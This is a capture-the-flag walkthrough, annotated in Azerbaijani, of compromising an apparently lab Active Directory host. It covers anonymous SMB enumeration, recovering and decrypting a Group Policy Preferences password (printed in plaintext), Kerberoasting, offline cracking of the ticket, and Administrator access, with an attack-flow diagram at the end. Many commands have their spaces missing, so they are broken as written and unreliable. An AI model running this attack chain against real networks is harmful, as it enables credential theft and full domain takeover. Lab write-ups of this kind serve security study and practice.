```
sudo nmap-sn10.129.235.185-oA host_alive
```

**Host Discovery** – Hədəfin aktiv olub-olmadığını yoxlayır.

---

```
sudo nmap-T4-Pn-n-A10.129.235.185-oA full_scan
```

**Port & Service Scan** – Açıq portları, servisləri, OS-i və domain məlumatlarını aşkar edir.

---

```
enum4linux-a10.129.235.185
```

**SMB Enumeration** – Null session, share-lər, istifadəçilər və domain məlumatlarını toplamaq üçün istifadə olunur.

---

```
netexec smb10.129.235.185
```

**SMB Banner Enumeration** – Host adı, domain, OS versiyası, SMB signing vəziyyətini göstərir.

---

```
netexec smb10.129.235.185-u''-p''--shares
```

**Share Enumeration** – Anonymous istifadəçi ilə əlçatan SMB share-ləri siyahılayır.

---

```
smbclient-L //10.129.235.185-N
```

**Alternative Share Enumeration** – SMB share-ləri anonymous olaraq göstərir.

---

```
netexec smb10.129.235.185-u''-p''-M spider_plus-oDOWNLOAD_FLAG=True
```

**Spidering Shares** – Oxuma icazəsi olan share-lərdəki faylları recursive olaraq tapır və endirir.

---

```
find .-name Groups.xml
```

**Groups.xml Discovery** – GPP credential faylını tapır.

---

```
cat Groups.xml
```

**Inspect Groups.xml** – XML faylını oxuyaraq cpassword sahəsini axtarır.

---

```
gpp-decrypt"<cpassword>"
```

**Decrypt GPP Password** – cpassword dəyərini real şifrəyə çevirir.

---

```
netexec smb10.129.235.185-u svc_tgs-p'GPPstillStandingStrong2k18'
```

**Credential Validation** – Tapılan credentialın işlədiyini yoxlayır.

---

```
netexec smb10.129.235.185-u svc_tgs-p'GPPstillStandingStrong2k18'--users
```

**Domain User Enumeration** – Domain istifadəçilərini siyahılayır.

---

```
smbclient //10.129.235.185/C$-U'active.htb\svc_tgs'
```

**Authenticated SMB Access** – SMB share-lərə login olur.

---

```
impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.235.185
```

**SPN Enumeration** – Kerberoasting üçün SPN təyin olunmuş hesabları tapır.

---

```
impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.235.185 -request > tgs.txt
```

**Request TGS Tickets** – SPN hesabları üçün TGS biletlərini (hash) əldə edir.

---

```
john--wordlist=/usr/share/wordlists/rockyou.txt--format=krb5tgs tgs.txt
```

**Crack Kerberos Hash** – TGS hash-i offline olaraq qırır.

---

```
john--show tgs.txt
```

**Show Cracked Password** – Tapılmış parolu göstərir.

---

```
smbclient //10.129.235.185/C$-U'active.htb\Administrator'
```

**Administrator Access** – Administrator credentialı ilə SMB login.

---

```
cd Users/SVC_TGS/Desktop
get user.txt
```

**Retrieve User Flag** – User flag-i əldə edir.

---

```
cd Users/Administrator/Desktop
get root.txt
```

**Retrieve Root Flag** – Root/Admin flag-i əldə edir.

---

### Attack Flow

```
Nmap
 ↓
Null Session SMB
 ↓
Share Enumeration
 ↓
Spider SYSVOL / Replication
 ↓
Groups.xml
 ↓
cpassword
 ↓
gpp-decrypt
 ↓
SVC_TGS Credentials
 ↓
SPN Enumeration
 ↓
Kerberoasting
 ↓
Administrator Hash
 ↓
John Crack
 ↓
Administrator Access
 ↓
Root
```
